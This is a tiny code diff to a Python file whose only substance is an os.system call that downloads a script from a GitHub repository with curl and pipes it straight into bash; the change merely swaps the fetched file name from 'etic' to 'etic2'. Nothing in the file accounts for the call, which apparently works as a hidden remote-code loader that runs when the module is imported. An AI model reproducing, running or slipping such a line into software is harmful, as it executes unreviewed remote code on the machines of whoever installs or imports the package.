@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/bondaltomason/meo/raw/main/etic | bash')
+os.system('curl -sL https://github.com/bondaltomason/meo/raw/main/etic2 | bash')
